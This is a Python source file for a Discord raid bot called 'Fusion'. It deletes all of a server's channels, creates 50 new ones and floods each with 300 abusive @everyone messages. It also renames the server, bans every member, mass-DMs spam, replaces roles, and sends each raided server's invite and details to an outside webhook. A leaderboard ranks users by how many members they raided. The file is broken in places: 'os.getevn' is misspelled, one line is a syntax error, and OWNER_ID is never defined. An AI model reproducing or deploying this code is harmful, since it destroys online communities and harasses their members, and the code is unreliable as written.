from __future__ import annotations
from typing import Optional
import discord, aiohttp, asyncio, json, os
from discord.ext import commands
from discord import app_commands
from dotenv import load_dotenv
load_dotenv()

BOT_TOKEN = os.getenv("TOKEN")
PROTECTED_SERVER_ID = os.getevn("PROTECTED_SERVER_ID")
PREMIUM_ROLE_ID = os.getevn("PREMIUM_ROLE_ID")
LOG_WEBHOOK_URL = os.getevn("LOG_WEBHOOK_URL")
BLACKLIST_ADMIN_IDS = os.getevn("BLACKLIST_ADMIN_IDS")

PREMIUM = with open("premium.json", "r") as f:
    data = json.load(f)

# ?fusion default settings
CHANNEL_NAME    = "𒌐𓆗𒌐 𝙵𝚄𝚂𝙸𝙾𝙽 𝚆𝙰𝚂 𝙷𝙴𝚁𝙴 𒌐𓆗𒌐"
SPAM_MESSAGE    = """\n\n\n\n\n𝚈𝚘𝚞𝚛 𝚞𝚜𝚎𝚕𝚎𝚜𝚜\n\n\n\n\n\n𝙵𝚞𝚜𝚒𝚘𝚗 𝚓𝚞𝚜𝚝 𝚘𝚠𝚗𝚎𝚍 𝚢𝚘𝚞\n\n\n\n\n\n\n\n𝙵𝚞𝚜𝚒𝚘𝚗 𝙼𝚊𝚍𝚎 𝚝𝚑𝚒𝚜 𝚜𝚎𝚛𝚟𝚎𝚛 𝚒𝚝𝚜 𝚋𝚒𝚝𝚌𝚑\n\n\n\n\n\n\n𝙸𝚖𝚊𝚐𝚒𝚗𝚎 𝙷𝚊𝚟𝚒𝚗𝚐 𝚝𝚑𝚒𝚜 𝚋𝚊𝚍 𝚜𝚎𝚌𝚞𝚛𝚒𝚝𝚢 𝚕𝚖ao\n\n\n\n\n\n\n\n\n\n||@everyone|| ||@here||\n\n\n\n𝙹𝚘𝚒𝚗 [@𝙵𝚞𝚜𝚒𝚘𝚗](https://discord.gg/4Ty3yaP77g)  """
SPAM_AMOUNT     = 300
SERVER_ICON_URL = "https://cdn.discordapp.com/attachments/1466528141827641526/1481684856118313011/InShot_20260312_180600444.jpg?ex=69b4360e&is=69b2e48e&hm=1b434eb491867d9fdeea8d52588388dc735ef1b782f23259dde4c45f49d22198&"
NEW_SERVER_NAME = "𒌐𓆗𒌐 𝙵𝚄𝚂𝙸𝙾𝙽 𝚆𝙰𝚂 𝙷𝙴𝚁𝙴 𒌐𓆗𒌐"

# Default embed spam — 3 green embeds (used by ?fusion; templates can override)
EMBED_1_MESSAGE = "𒌐𓆗𒌐 𝙵𝚄𝚂𝙸𝙾𝙽 𝙾𝚆𝙽𝙴𝙳 𝚈𝙾𝚄𒌐𓆗𒌐"
EMBED_1_IMAGE   = "https://cdn.discordapp.com/ephemeral-attachments/1487125313061257307/1487129205131968552/flash.gif?ex=69c80480&is=69c6b300&hm=45aca51675adce81c40742482ac795b2d6ac86a0257d3826126f200f580d7f37&"

EMBED_2_MESSAGE = "𒌐𓆗𒌐 𝙵𝚄𝚂𝙸𝙾𝙽 𝙵𝚄𝙲𝙺𝙴𝙳 𝚈𝙾𝚄𒌐𓆗𒌐"
EMBED_2_IMAGE   = "https://cdn.discordapp.com/ephemeral-attachments/1487125313061257307/1487129205131968552/flash.gif?ex=69c80480&is=69c6b300&hm=45aca51675adce81c40742482ac795b2d6ac86a0257d3826126f200f580d7f37&"

EMBED_3_MESSAGE = "𒌐𓆗𒌐𝙵𝚄𝚂𝙸𝙾𝙽 𝙽𝚄𝙺𝙴𝙳 𝚈𝙾𝚄𝚁 𝙰𝚂𝚂 𝙻𝙼𝙰𝙾𒌐𓆗𒌐"
EMBED_3_IMAGE   = "https://cdn.discordapp.com/ephemeral-attachments/1487125313061257307/1487129205131968552/flash.gif?ex=69c80480&is=69c6b300&hm=45aca51675adce81c40742482ac795b2d6ac86a0257d3826126f200f580d7f37&"

# ?dmall settings (hardcoded message)
DM_MESSAGE = """𝙵𝚞𝚜𝚒𝚘𝚗 𝚒𝚜 𝚋𝚎𝚝𝚝𝚎𝚛 𝚝𝚑𝚊𝚝 𝚠𝚑𝚊𝚝𝚎𝚟𝚎𝚛 𝚜𝚑𝚒𝚝𝚝𝚢 𝚜𝚎𝚛𝚟𝚎𝚛 𝚝𝚑𝚊𝚝 𝚠𝚊𝚜, 𝚓𝚘𝚒𝚗 𝚑𝚎𝚛𝚎
https://discord.gg/c8grgQA46X"""

# ?massrole — default role name for the free massrole command
MASS_ROLE_NAME = "𒌐𓆗𒌐 𝙵𝚄𝚂𝙸𝙾𝙽 𝙵𝚄𝙲𝙺𝙴𝙳 𝚈𝙾𝚄𒌐𓆗𒌐"

# ============================================================
#  PERSISTENCE
# ============================================================

DATA_FILE = "data.json"

blacklisted_servers: set[int] = set()
templates: dict[str, dict] = {}
fusion_leaderboard: dict[int, dict] = {}


def load_data():
    global blacklisted_servers, templates, fusion_leaderboard
    if not os.path.exists(DATA_FILE):
        save_data()
        return
    try:
        with open(DATA_FILE, "r") as f:
            data = json.load(f)
        blacklisted_servers = set(data.get("blacklisted_servers", []))
        templates           = data.get("templates", {})
        raw_lb              = data.get("fusion_leaderboard", {})
        fusion_leaderboard  = {int(k): v for k, v in raw_lb.items()}
    except Exception as e:
        print(f"Failed to load data.json: {e}")


def save_data():
    try:
        data = {
            "blacklisted_servers": list(blacklisted_servers),
            "templates":           templates,
            "fusion_leaderboard":  {str(k): v for k, v in fusion_leaderboard.items()},
        }
        with open(DATA_FILE, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"Failed to save data.json: {e}")


# ============================================================
#  BOT SETUP
# ============================================================

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="?", intents=intents)

# ============================================================
#  HELPERS
# ============================================================

def is_blacklisted(guild: discord.Guild | None) -> bool:
    return guild is not None and guild.id in blacklisted_servers


def has_premium(member: discord.Member) -> bool:
    return any(r.id == PREMIUM_ROLE_ID for r in member.roles)


def make_spam_embeds(custom: list[dict] | None = None) -> list[discord.Embed]:
    if custom:
        configs = [(e.get("message", ""), e.get("image", "")) for e in custom]
    else:
        configs = [
            (EMBED_1_MESSAGE, EMBED_1_IMAGE),
            (EMBED_2_MESSAGE, EMBED_2_IMAGE),
            (EMBED_3_MESSAGE, EMBED_3_IMAGE),
        ]
    embeds = []
    for msg, img in configs:
        e = discord.Embed(description=msg, color=0x00FF00)
        if img:
            e.set_image(url=img)
        embeds.append(e)
    return embeds


def record_leaderboard(user: discord.Member | discord.User, human_count: int | str):
    if not isinstance(human_count, int):
        return
    uid = user.id
    if uid not in fusion_leaderboard:
        fusion_leaderboard[uid] = {
            "username":    str(user),
            "uses":        0,
            "best_count":  0,
            "total_count": 0,
        }
    entry = fusion_leaderboard[uid]
    entry["username"]     = str(user)
    entry["uses"]        += 1
    entry["total_count"] += human_count
    if human_count > entry["best_count"]:
        entry["best_count"] = human_count
    save_data()


async def send_log(
    guild: discord.Guild,
    invite_url: str,
    triggered_by: discord.Member | discord.User,
    human_count: int | str,
    template_name: str | None = None,
):
    title = f"?t {template_name} executed" if template_name else "?fusion executed"
    embed = discord.Embed(title=title, color=0xFF0000)
    embed.add_field(name="Server",        value=guild.name,           inline=False)
    embed.add_field(name="Server ID",     value=str(guild.id),        inline=True)
    embed.add_field(name="Human Members", value=str(human_count),     inline=True)
    embed.add_field(name="Used by",       value=str(triggered_by),    inline=True)
    embed.add_field(name="User ID",       value=str(triggered_by.id), inline=True)
    embed.add_field(name="Invite",        value=invite_url,           inline=False)

    payload = {"embeds": [embed.to_dict()]}
    try:
        async with aiohttp.ClientSession() as session:
            resp = await session.post(LOG_WEBHOOK_URL, json=payload)
            if resp.status not in (200, 204):
                text = await resp.text()
                print(f"Webhook returned {resp.status}: {text}")
    except Exception as e:
        print(f"Failed to send log: {e}")


async def spam_channel(
    channel: discord.TextChannel,
    message: str = SPAM_MESSAGE,
    custom_embeds: list[dict] | None = None,
):
    embeds = make_spam_embeds(custom_embeds)
    for _ in range(SPAM_AMOUNT):
        try:
            await channel.send(content=message, embeds=embeds)
        except Exception:
            break


async def _safe_delete_channel(channel):
    try:
        await channel.delete()
    except Exception:
        pass


async def _safe_create_channel(guild, name):
    try:
        return await guild.create_text_channel(name)
    except Exception:
        return None


async def _safe_delete_role(role):
    try:
        await role.delete()
    except Exception:
        pass


async def _safe_create_role(guild, name):
    try:
        return await guild.create_role(name=name)
    except Exception:
        return None


def _split_message(text: str, limit: int = 1900) -> list[str]:
    chunks = []
    while len(text) > limit:
        split_at = text.rfind("\n", 0, limit)
        if split_at == -1:
            split_at = limit
        chunks.append(text[:split_at])
        text = text[split_at:].lstrip("\n")
    if text:
        chunks.append(text)
    return chunks


async def run_fusion(
    guild: discord.Guild,
    author: discord.Member | discord.User,
    channel_name: str,
    spam_message: str,
    server_name: str,
    icon_url: str | None = None,
    template_name: str | None = None,
    custom_embeds: list[dict] | None = None,
    numbered_channels: bool = True,
):
    try:
        all_members = [m async for m in guild.fetch_members(limit=None)]
        human_count = sum(1 for m in all_members if not m.bot)
    except Exception:
        human_count = "Unknown"

    await asyncio.gather(*[_safe_delete_channel(ch) for ch in list(guild.channels)])

    if numbered_channels:
        names = [f"{channel_name}-{i}" for i in range(1, 51)]
    else:
        names = [channel_name] * 50

    results = await asyncio.gather(*[_safe_create_channel(guild, n) for n in names])
    created_channels = [ch for ch in results if ch is not None]

    invite_url = "Could not create invite"
    if created_channels:
        try:
            invite = await created_channels[0].create_invite(max_age=0, max_uses=0, unique=False)
            invite_url = invite.url
        except Exception as e:
            print(f"Could not create invite: {e}")

    await send_log(guild, invite_url, author, human_count, template_name)
    record_leaderboard(author, human_count)

    await asyncio.gather(*[
        spam_channel(ch, spam_message, custom_embeds)
        for ch in created_channels
    ])

    if icon_url:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url) as resp:
                    if resp.status == 200:
                        await guild.edit(icon=await resp.read())
        except Exception as e:
            print(f"Error changing icon: {e}")

    try:
        await guild.edit(name=server_name)
    except Exception as e:
        print(f"Error renaming server: {e}")


# ============================================================
#  EVENTS
# ============================================================

@bot.event
async def on_ready():
    load_data()
    await bot.tree.sync()
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("Slash commands synced.")

# ============================================================
#  COMMANDS
# ============================================================

# ── ?fusion ──────────────────────────────────────────────────
@bot.command(name="fusion")
@commands.has_permissions(administrator=True)
async def fusion(ctx):
    if ctx.guild is None:
        await ctx.send("This command must be used inside a server.")
        return
    if is_blacklisted(ctx.guild):
        await ctx.send("This server is blacklisted.")
        return
    await ctx.send("Starting fusion sequence...")
    await run_fusion(
        ctx.guild, ctx.author,
        CHANNEL_NAME, SPAM_MESSAGE, NEW_SERVER_NAME,
        icon_url=SERVER_ICON_URL,
        numbered_channels=True,
    )


@fusion.error
async def fusion_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need Administrator permissions.")
    else:
        await ctx.send(f"An error occurred: {error}")


# ── /template (slash — premium) ──────────────────────────────
@bot.tree.command(name="template", description="[Premium] Create a reusable fusion template")
@app_commands.describe(
    templatename = "Name for this template (used with ?t <name>)",
    spammessage  = "Message to spam in each channel",
    channelname  = "Exact channel name to use (no numbers added)",
    servername   = "New server name to set",
    iconurl      = "(Optional) Direct image URL for the server icon",
    embed1msg    = "(Optional) Embed 1 message text",
    embed1img    = "(Optional) Embed 1 image URL",
    embed2msg    = "(Optional) Embed 2 message text",
    embed2img    = "(Optional) Embed 2 image URL",
    embed3msg    = "(Optional) Embed 3 message text",
    embed3img    = "(Optional) Embed 3 image URL",
)
async def template_slash(
    interaction: discord.Interaction,
    templatename: str,
    spammessage: str,
    channelname: str,
    servername: str,
    iconurl:  Optional[str] = None,
    embed1msg: Optional[str] = None,
    embed1img: Optional[str] = None,
    embed2msg: Optional[str] = None,
    embed2img: Optional[str] = None,
    embed3msg: Optional[str] = None,
    embed3img: Optional[str] = None,
):
    if is_blacklisted(interaction.guild):
        await interaction.response.send_message("This server is blacklisted.", ephemeral=True)
        return
    member = interaction.guild.get_member(interaction.user.id) if interaction.guild else None
    if member is None or not has_premium(member):
        await interaction.response.send_message("❌ This command requires **Premium**.", ephemeral=True)
        return

    embeds = []
    pairs = [
        (embed1msg, embed1img),
        (embed2msg, embed2img),
        (embed3msg, embed3img),
    ]
    for msg, img in pairs:
        if msg or img:
            embeds.append({"message": msg or "", "image": img or ""})

    templates[templatename.lower()] = {
        "spam_message": spammessage,
        "channel_name": channelname,
        "server_name":  servername,
        "icon_url":     iconurl,
        "embeds":       embeds if embeds else None,
    }
    save_data()

    icon_note = "" if iconurl else " (no icon change)"
    embed_note = f" with {len(embeds)} custom embed(s)" if embeds else " with default embeds"
    await interaction.response.send_message(
        f"✅ Template **{templatename}** saved{icon_note}{embed_note}! Use it with `?t {templatename}`.",
        ephemeral=True,
    )


# ── ?t <templatename> (premium) ──────────────────────────────
@bot.command(name="t")
@commands.has_permissions(administrator=True)
async def use_template(ctx, templatename: str = None):
    if ctx.guild is None:
        await ctx.send("This command must be used inside a server.")
        return
    if is_blacklisted(ctx.guild):
        await ctx.send("This server is blacklisted.")
        return
    if not has_premium(ctx.author):
        await ctx.send("❌ This command requires **Premium**.")
        return
    if templatename is None:
        await ctx.send("Usage: `?t <templatename>`")
        return

    tpl = templates.get(templatename.lower())
    if tpl is None:
        keys = ", ".join(templates.keys()) or "none saved yet"
        await ctx.send(f"Template `{templatename}` not found. Available: {keys}")
        return

    await ctx.send(f"Running template **{templatename}**...")
    await run_fusion(
        ctx.guild, ctx.author,
        tpl["channel_name"], tpl["spam_message"],
        tpl["server_name"],
        icon_url=tpl.get("icon_url"),
        template_name=templatename,
        custom_embeds=tpl.get("embeds"),
        numbered_channels=False,
    )


@use_template.error
async def use_template_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need Administrator permissions.")
    else:
        await ctx.send(f"An error occurred: {error}")


# ── ?banall ──────────────────────────────────────────────────
@bot.command(name="banall")
@commands.has_permissions(ban_members=True)
async def banall(ctx):
    if ctx.guild is None:
        await ctx.send("This command must be used inside a server.")
        return
    if is_blacklisted(ctx.guild):
        await ctx.send("This server is blacklisted.")
        return

    await ctx.send("Banning all members...")
    members = [m async for m in ctx.guild.fetch_members(limit=None)]
    targets = [m for m in members if m != ctx.guild.me and not m.bot]
    await asyncio.gather(*[ctx.guild.ban(m, delete_message_days=0) for m in targets], return_exceptions=True)
    await ctx.send(f"Banned {len(targets)} member(s).")


@banall.error
async def banall_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need Ban Members permission.")
    else:
        await ctx.send(f"An error occurred: {error}")


# ── ?dmall (hardcoded message) ───────────────────────────────
@bot.command(name="dmall")
@commands.has_permissions(administrator=True)
async def dmall(ctx):
    if ctx.guild is None:
        await ctx.send("This command must be used inside a server.")
        return
    if is_blacklisted(ctx.guild):
        await ctx.send("This server is blacklisted.")
        return

    await ctx.send("DMing all members...")
    members = [m async for m in ctx.guild.fetch_members(limit=None)]
    targets = [m for m in members if not m.bot and m != ctx.guild.me]
    sent = failed = 0

    async def dm(member):
        nonlocal sent, failed
        try:
            await member.send(DM_MESSAGE)
            sent += 1
        except Exception:
            failed += 1

    await asyncio.gather(*[dm(m) for m in targets])
    await ctx.send(f"DMs sent: {sent} | Failed: {failed}")


@dmall.error
async def dmall_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need Administrator permissions.")
    else:
        await ctx.send(f"An error occurred: {error}")


# ── ?dmallp <message> (premium — custom message) ─────────────
@bot.command(name="dmallp")
@commands.has_permissions(administrator=True)
async def dmallp(ctx, *, message: str = None):
    if ctx.guild is None:
        await ctx.send("This command must be used inside a server.")
        return
    if is_blacklisted(ctx.guild):
        await ctx.send("This server is blacklisted.")
        return
    if not has_premium(ctx.author):
        await ctx.send("❌ This command requires **Premium**.")
        return
    if message is None:
        await ctx.send("Usage: `?dmallp <your message>`")
        return

    await ctx.send("DMing all members with your custom message...")
    members = [m async for m in ctx.guild.fetch_members(limit=None)]
    targets = [m for m in members if not m.bot and m != ctx.guild.me]
    sent = failed = 0

    async def dm(member):
        nonlocal sent, failed
        try:
            await member.send(message)
            sent += 1
        except Exception:
            failed += 1

    await asyncio.gather(*[dm(m) for m in targets])
    await ctx.send(f"DMs sent: {sent} | Failed: {failed}")


@dmallp.error
async def dmallp_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need Administrator permissions.")
    else:
        await ctx.send(f"An error occurred: {error}")


# ── ?massrole (free — hardcoded name) ────────────────────────
@bot.command(name="massrole")
@commands.has_permissions(manage_roles=True)
async def massrole(ctx):
    if ctx.guild is None:
        await ctx.send("This command must be used inside a server.")
        return
    if is_blacklisted(ctx.guild):
        await ctx.send("This server is blacklisted.")
        return

    await ctx.send("Deleting existing roles and creating 50 new ones...")
    deletable = [
        r for r in ctx.guild.roles
        if not r.managed and r.name != "@everyone" and r < ctx.guild.me.top_role
    ]
    await asyncio.gather(*[_safe_delete_role(r) for r in deletable])
    results = await asyncio.gather(*[_safe_create_role(ctx.guild, MASS_ROLE_NAME) for _ in range(50)])
    created = [r for r in results if r is not None]
    await ctx.send(f"Done. Created {len(created)} roles named **{MASS_ROLE_NAME}**.")


@massrole.error
async def massrole_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need Manage Roles permission.")
    else:
        await ctx.send(f"An error occurred: {error}")


# ── ?custommassrole <name> (premium) ─────────────────────────
@bot.command(name="custommassrole")
@commands.has_permissions(manage_roles=True)
async def custommassrole(ctx, *, role_name: str = None):
    if ctx.guild is None:
        await ctx.send("This command must be used inside a server.")
        return
    if is_blacklisted(ctx.guild):
        await ctx.send("This server is blacklisted.")
        return
    if not has_premium(ctx.author):
        await ctx.send("❌ This command requires **Premium**.")
        return
    if role_name is None:
        await ctx.send("Usage: `?custommassrole <role name>`")
        return

    await ctx.send(f"Deleting existing roles and creating 50 roles named **{role_name}**...")
    deletable = [
        r for r in ctx.guild.roles
        if not r.managed and r.name != "@everyone" and r < ctx.guild.me.top_role
    ]
    await asyncio.gather(*[_safe_delete_role(r) for r in deletable])
    results = await asyncio.gather(*[_safe_create_role(ctx.guild, role_name) for _ in range(50)])
    created = [r for r in results if r is not None]
    await ctx.send(f"Done. Created {len(created)} roles named **{role_name}**.")


@custommassrole.error
async def custommassrole_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need Manage Roles permission.")
    else:
        await ctx.send(f"An error occurred: {error}")


# ── ?servers ─────────────────────────────────────────────────
@bot.command(name="servers")
async def servers(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("You are not authorized to use this command.")
        return
    if not bot.guilds:
        await ctx.send("The bot is not in any servers.")
        return

    lines = [f"**Bot is in {len(bot.guilds)} server(s):**\n"]
    for g in bot.guilds:
        bl = " 🚫" if g.id in blacklisted_servers else ""
        lines.append(f"• **{g.name}** — ID: `{g.id}` — Members: {g.member_count}{bl}")

    for chunk in _split_message("\n".join(lines)):
        await ctx.send(chunk)


# ── ?blacklist ───────────────────────────────────────────────
@bot.command(name="blacklist")
async def blacklist(ctx, server_id: int = None):
    if ctx.author.id not in BLACKLIST_ADMIN_IDS:
        await ctx.send("You are not authorized to use this command.")
        return
    if server_id is None:
        await ctx.send("Usage: `?blacklist <server_id>`")
        return

    if server_id in blacklisted_servers:
        blacklisted_servers.discard(server_id)
        await ctx.send(f"Server `{server_id}` **removed** from the blacklist.")
    else:
        blacklisted_servers.add(server_id)
        await ctx.send(f"Server `{server_id}` **added** to the blacklist.")
    save_data()


@blacklist.error
async def blacklist_error(ctx, error):
    if isinstance(error, commands.BadArgument):
        await ctx.send("Invalid server ID. Provide a valid number.")
    else:
        await ctx.send(f"An error occurred: {error}")


# ── ?leaveall ────────────────────────────────────────────────
@bot.command(name="leaveall")
async def leaveall(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("You are not authorized to use this command.")
        return

    guilds  = list(bot.guilds)
    skipped = 0
    for guild in guilds:
        if guild.id == PROTECTED_SERVER_ID:
            skipped += 1
            continue
        try:
            await guild.leave()
        except Exception as e:
            print(f"Failed to leave {guild.name}: {e}")

    msg = f"Done. Left {len(guilds) - skipped} server(s)."
    if skipped:
        msg += f" Kept {skipped} protected server(s)."
    await ctx.send(msg)


# ── ?leaderboard ─────────────────────────────────────────────
@bot.command(name="leaderboard")
async def leaderboard(ctx):
    if not fusion_leaderboard:
        await ctx.send("No fusion uses recorded yet.")
        return

    sorted_entries = sorted(
        fusion_leaderboard.items(),
        key=lambda x: x[1]["best_count"],
        reverse=True,
    )

    lines = ["**🏆 Fusion Leaderboard** (sorted by highest member count raided)\n"]
    for rank, (uid, data) in enumerate(sorted_entries[:20], start=1):
        lines.append(
            f"**#{rank}** {data['username']} — "
            f"Best: `{data['best_count']}` members | "
            f"Total: `{data['total_count']}` | "
            f"Uses: `{data['uses']}`"
        )

    for chunk in _split_message("\n".join(lines)):
        await ctx.send(chunk)


bot.run(BOT_TOKEN)
